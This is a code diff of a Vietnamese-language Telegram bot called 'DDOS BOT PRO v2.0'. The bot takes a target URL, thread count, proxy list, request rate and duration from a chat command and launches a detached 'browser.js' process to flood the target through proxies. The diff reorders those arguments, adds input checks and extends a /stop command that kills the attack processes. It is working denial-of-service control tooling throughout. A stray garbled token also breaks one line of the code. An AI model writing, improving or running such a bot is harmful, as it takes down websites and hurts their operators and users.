@@ -25,11 +25,14 @@ bot.onText(/\/start/, (msg) => {
 *DDOS BOT PRO v2.0*
 
 *Lệnh:*
-/d <url> <giây> [luồng] [proxy_file] [rate]
+/d <url> <luồng> [proxy_file] [rate] <giây>
+
+*Thứ tự bắt buộc:*
+\`node browser.js <targetURL> <threads> <proxyFile> <rate> <time>\`
 
 *Ví dụ:*
-/d https://example.com 60
-/d https://example.com 120 10 proxy2.txt 200
+/d https://example.com 10 60
+/d https://example.com 20 proxy2.txt 200 120
 
 *Proxy mặc định:* \`${DEFAULT_PROXY_FILE}\`
 /stop → Dừng tất cả
@@ -44,83 +47,114 @@ bot.onText(/\/d\s+(.+)/, (msg, match) => {
     if (isRunning) return bot.sendMessage(chatId, 'Đang chạy! Dùng /stop trước.');
 
     const args = match[1].trim().split(/\s+/);
-    let [target, duration, threads = '5', proxyFile = DEFAULT_PROXY_FILE, rate = '100'] = args;
+    if (args.length < 3) {
+        return bot.sendMessage(chatId, 'Thiếu tham số!\nVí dụ: `/d https://example.com 10 60`', { parse_mode: 'Markdown' });
+    }
 
-    // Validate
+    let target = args[0];
+    let threads = args[1];
+    let proxyFile = DEFAULT_PROXY_FILE;
+    let rate = '100';
+    let time = args[args.length - 1]; // time là tham số cuối cùng
+
+    // Xử lý các tham số tùy chọn (giữa threads và time)
+    const middleArgs = args.slice(2, -1);
+    middleArgs.forEach(arg => {
+        if (arg.endsWith('.txt') && fs.existsSync(arg)) {
+            proxyFile = arg;
+        } else if (!isNaN(arg) && parseInt(arg) > 0) {
+            rate = arg;
+        }
+    });
+
+    // === VALIDATE ===
     if (!/^https?:\/\//i.test(target)) {
         return bot.sendMessage(chatId, 'URL phải bắt đầu bằng http:// hoặc https://');
     }
-    duration = parseInt(duration);
-    if (isNaN(duration) || duration < 10) return bot.sendMessage(chatId, 'Thời gian ≥ 10 giây');
 
-    threads = Math.min(Math.max(parseInt(threads), 1), 50) || 5;
-    rate = parseInt(rate) || 100;
+    const duration = parseInt(time);
+    if (isNaN(duration) || duration < 10) {
+        return bot.sendMessage(chatId, 'Thời gian (giây) phải ≥ 10');
+    }
+
+    const threadCount = Math.min(Math.max(parseInt(threads), 1), 50);
+    if (isNaN(threadCount)) {
+        return bot.sendMessage(chatId, 'Số luồng phải là số từ 1 đến 50');
+    }
+
+ circul   const rateLimit = parseInt(rate) || 100;
+    if (rateLimit < 1 || rateLimit > 1000) {
+        return bot.sendMessage(chatId, 'Rate phải từ 1 đến 1000');
+    }
 
     // Kiểm tra proxy
     if (!checkProxyFile(proxyFile)) {
-        return bot.sendMessage(chatId, `Không tìm thấy file: \`${proxyFile}\``, {
+        return bot.sendMessage(chatId, `Không tìm thấy file proxy: \`${proxyFile}\``, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [[
-                    { text: `Dùng ${DEFAULT_PROXY_FILE}`, callback_data: `use_default|${target}|${duration}|${threads}|${rate}` }
+                    { text: `Dùng ${DEFAULT_PROXY_FILE}`, callback_data: `use_default|${target}|${threadCount}|${rateLimit}|${duration}` }
                 ]]
             }
         });
     }
 
-    runAttack(chatId, target, duration, threads, proxyFile, rate);
+    runAttack(chatId, target, threadCount, proxyFile, rateLimit, duration);
 });
 
-// Inline button
+// Inline button: dùng proxy mặc định
 bot.on('callback_query', (query) => {
     if (!query.data.startsWith('use_default')) return;
-    const [_, target, duration, threads, rate] = query.data.split('|');
+    const [_, target, threads, rate, duration] = query.data.split('|');
     const chatId = query.message.chat.id;
     bot.deleteMessage(chatId, query.message.message_id);
-    runAttack(chatId, target, +duration, +threads, DEFAULT_PROXY_FILE, +rate);
+    runAttack(chatId, target, +threads, DEFAULT_PROXY_FILE, +rate, +duration);
 });
 
 // === CHẠY TẤN CÔNG ===
-const runAttack = (chatId, target, duration, threads, proxyFile, rate) => {
+const runAttack = (chatId, target, threads, proxyFile, rate, duration) => {
     bot.sendMessage(chatId, `
-*Khởi chạy...*
+*Khởi chạy tấn công...*
 URL: \`${target}\`
-Thời gian: \`${duration}s\`
 Luồng: \`${threads}\`
 Proxy: \`${proxyFile}\`
 Rate: \`${rate}\`
+Thời gian: \`${duration}s\`
     `, { parse_mode: 'Markdown' });
 
-    const args = [target, duration, threads, proxyFile, rate];
+    // ĐÚNG THỨ TỰ: targetURL, threads, proxyFile, rate, time
+    const args = [target, threads.toString(), proxyFile, rate.toString(), duration.toString()];
     activeProcess = spawn('node', ['browser.js', ...args], { detached: true, stdio: 'ignore' });
     activeProcess.unref();
     isRunning = true;
 
-    log(chalk.green, `[BOT] Spawn: browser.js ${args.join(' ')}`);
+    log(chalk.green, `[BOT] Spawn: node browser.js ${args.join(' ')}`);
 
     setTimeout(() => {
         if (isRunning) {
-            bot.sendMessage(chatId, 'Thời gian chạy kết thúc.');
+            bot.sendMessage(chatId, '*Tấn công đã kết thúc theo thời gian.*', { parse_mode: 'Markdown' });
             isRunning = false;
+            activeProcess = null;
         }
-    }, (duration + 10) * 1000);
+    }, (duration + 15) * 1000); // +15s dư để đảm bảo
 };
 
 // === LỆNH /stop ===
 bot.onText(/\/stop/, (msg) => {
     const chatId = msg.chat.id;
-    if (!isRunning) return bot.sendMessage(chatId, 'Không có tiến trình nào.');
+    if (!isRunning) return bot.sendMessage(chatId, 'Không có tiến trình nào đang chạy.');
 
-    require('child_process').exec('taskkill /f /im node.exe 2>nul || pkill -f node', () => {});
+    // Kill tất cả node và trình duyệt
+    require('child_process').exec('taskkill /f /im node.exe 2>nul || pkill -f "node browser.js"', () => {});
     require('child_process').exec('taskkill /f /im msedge.exe 2>nul || pkill -f chrome', () => {});
 
     isRunning = false;
     activeProcess = null;
-    bot.sendMessage(chatId, '*ĐÃ DỪNG HOÀN TOÀN!*', { parse_mode: 'Markdown' });
-    log(chalk.red, '[BOT] Đã kill tất cả process');
+    bot.sendMessage(chatId, '*ĐÃ DỪNG HOÀN TOÀN TẤT CẢ TIẾN TRÌNH!*', { parse_mode: 'Markdown' });
+    log(chalk.red, '[BOT] Đã dừng tất cả tiến trình');
 });
 
-// Lỗi
+// Xử lý lỗi polling
 bot.on('polling_error', (err) => log(chalk.red, `Polling error: ${err.message}`));
 
-console.log(chalk.cyan.bold('Bot PRO v2.0 đang chạy... Gửi /start'));
+console.log(chalk.cyan.bold('Bot PRO v2.0 đang chạy... Gửi /start để bắt đầu'));
